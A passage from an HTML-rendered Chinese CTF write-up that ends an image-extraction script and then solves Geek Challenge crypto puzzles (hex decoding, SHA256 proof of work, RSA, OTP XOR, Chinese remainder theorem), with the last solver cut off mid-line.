data-num=\"43\"></td><td><pre>        extracted_image<span class=\"token punctuation\">[</span>white_pixels<span class=\"token punctuation\">,</span> frame_count<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> col_to_scan<span class=\"token punctuation\">[</span>white_pixels<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token comment\"># 更新列数，为下一帧准备</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        col_count <span class=\"token operator\">+=</span> col_interval</pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token comment\"># 更新帧数</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    frame_count <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># 释放视频资源</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>cap<span class=\"token punctuation\">.</span>release<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># 裁剪图片以匹配实际读取的帧数</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>extracted_image <span class=\"token operator\">=</span> extracted_image<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span>frame_count<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># 保存提取的像素形成的图片</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>cv2<span class=\"token punctuation\">.</span>imwrite<span class=\"token punctuation\">(</span><span class=\"token string\">'extracted_image.png'</span><span class=\"token punctuation\">,</span> extracted_image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\"># 显示图片</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>cv2<span class=\"token punctuation\">.</span>imshow<span class=\"token punctuation\">(</span><span class=\"token string\">'Extracted Image'</span><span class=\"token punctuation\">,</span> extracted_image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>cv2<span class=\"token punctuation\">.</span>waitKey<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>cv2<span class=\"token punctuation\">.</span>destroyAllWindows<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/17.png\" alt=\"image-20231120094433088\"></p>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"signin\"><a class=\"markdownIt-Anchor\" href=\"#signin\">#</a> SignIn</h3>\n<blockquote>\n<p>5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7d… Hmm… Something goes wrong with my grettings bot.</p>\n</blockquote>\n<p>义眼盯真。16 进制 ascii 转化得到 flag</p>\n<h3 id=\"proof_of_work\"><a class=\"markdownIt-Anchor\" href=\"#proof_of_work\">#</a> proof_of_work</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> product</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pass_POW</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    rec <span class=\"token operator\">=</span> <span class=\"token string\">'sha256(XXXX+FCxk8M9svYwVMfGe) == 793edc396da13a7992b429e50e7d122c41debbd902419d26a0792b4008dba844'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    table <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    suffix <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r'\\(XXXX\\+(.*?)\\)'</span><span class=\"token punctuation\">,</span> rec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    last_hash <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r'== (.*?)$'</span><span class=\"token punctuation\">,</span> rec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"suffix: %s, last_hash: %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>suffix<span class=\"token punctuation\">,</span> last_hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> product<span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">,</span> repeat<span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        prefix <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        guess <span class=\"token operator\">=</span> prefix <span class=\"token operator\">+</span> suffix</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span>guess<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> last_hash<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prefix XXXX is %s\"</span> <span class=\"token operator\">%</span> prefix<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">return</span> prefix</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>pass_POW<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/11.png\" alt=\"image-20231029212225830\"></p>\n<h3 id=\"simplersa\"><a class=\"markdownIt-Anchor\" href=\"#simplersa\">#</a> SimpleRSA</h3>\n<p>第一次见，涨姿势了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">b\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">35</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">,</span>q <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">2048</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token string\">\"__\"</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>c <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>powmod<span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472</span></pre></td></tr></table></figure><p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/12.png\" alt=\"image-20231029212545246\"></p>\n<h3 id=\"otptwice\"><a class=\"markdownIt-Anchor\" href=\"#otptwice\">#</a> OTPTwice</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> xor </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> os <span class=\"token keyword\">import</span> urandom </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">b\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># step0: key generation &amp; distribution</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s0</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    k1<span class=\"token punctuation\">,</span>k2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>urandom<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token string\">\"__\"</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> k1<span class=\"token punctuation\">,</span>k2 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#  </span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># step1: Alice encrypt M, and send it to Bob</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s1</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    c1 <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> c1 </pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># step2: Bob encrypt c1, and send it to Alice </span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s2</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    c2 <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> c2 </pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># step3: Alice decrypt c2, and send it to Bob.</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s3</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    c3 <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> c3 </pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># step4: Bob decrypt c3, get M.</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s4</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    m_ <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">return</span> m_ </pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    c1 <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    c2 <span class=\"token operator\">=</span> s2<span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    c3 <span class=\"token operator\">=</span> s3<span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    m_ <span class=\"token operator\">=</span> s4<span class=\"token punctuation\">(</span>c3<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">assert</span> msg <span class=\"token operator\">==</span> m_</pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\"># Here's what hacker Eve got:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt_</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    c1 <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    c2 <span class=\"token operator\">=</span> s2<span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    c3 <span class=\"token operator\">=</span> s3<span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    m_ <span class=\"token operator\">=</span> s4<span class=\"token punctuation\">(</span>c3<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">if</span> HACK <span class=\"token operator\">==</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c3<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>k1<span class=\"token punctuation\">,</span>k2 <span class=\"token operator\">=</span> s0<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"53\"></td><td><pre>encrypt_<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>b'\\xdbi\\xab\\x8d\\xfb0\\xd3\\xfe!\\xf8Xpy\\x80w\\x8c\\x87\\xb9'</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>b'o\\xb0%\\xfb\\xdb\\x0e\\r\\x04\\xde\\xd1\\x9a\\x08w\\xda4\\x0f\\x0cR'</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>b'\\xe7\\x80\\xcd\\ria\\xb2\\xca\\x89\\x1a\\x9d;|#3\\xf7\\xbb\\x96'</pre></td></tr><tr><td data-num=\"59\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> xor </pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>C1<span class=\"token operator\">=</span><span class=\"token string\">b'\\xdbi\\xab\\x8d\\xfb0\\xd3\\xfe!\\xf8Xpy\\x80w\\x8c\\x87\\xb9'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>C2<span class=\"token operator\">=</span><span class=\"token string\">b'o\\xb0%\\xfb\\xdb\\x0e\\r\\x04\\xde\\xd1\\x9a\\x08w\\xda4\\x0f\\x0cR'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>C3<span class=\"token operator\">=</span><span class=\"token string\">b'\\xe7\\x80\\xcd\\ria\\xb2\\xca\\x89\\x1a\\x9d;|#3\\xf7\\xbb\\x96'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>K1<span class=\"token operator\">=</span>xor<span class=\"token punctuation\">(</span>C2<span class=\"token punctuation\">,</span>C3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>K2<span class=\"token operator\">=</span>xor<span class=\"token punctuation\">(</span>C2<span class=\"token punctuation\">,</span>C1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>flag<span class=\"token operator\">=</span>xor<span class=\"token punctuation\">(</span>K1<span class=\"token punctuation\">,</span>C1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"oldalgorithm\"><a class=\"markdownIt-Anchor\" href=\"#oldalgorithm\">#</a> OldAlgorithm</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">b\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pad <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> msg<span class=\"token punctuation\">,</span>padlen<span class=\"token punctuation\">:</span> msg<span class=\"token operator\">+</span>os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span>padlen<span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>flag <span class=\"token operator\">=</span> pad<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p='</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'c='</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> long_to_bytes</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">chinese_remainder_theorem</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\"># 计算模数的乘积</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    N <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        N <span class=\"token operator\">*=</span> i</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\"># 计算每个模数的乘积</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        Ni <span class=\"token operator\">=</span> N <span class=\"token operator\">//</span> p<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\"># 计算模反元素</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        Mi <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>Ni<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">[</span>i<span 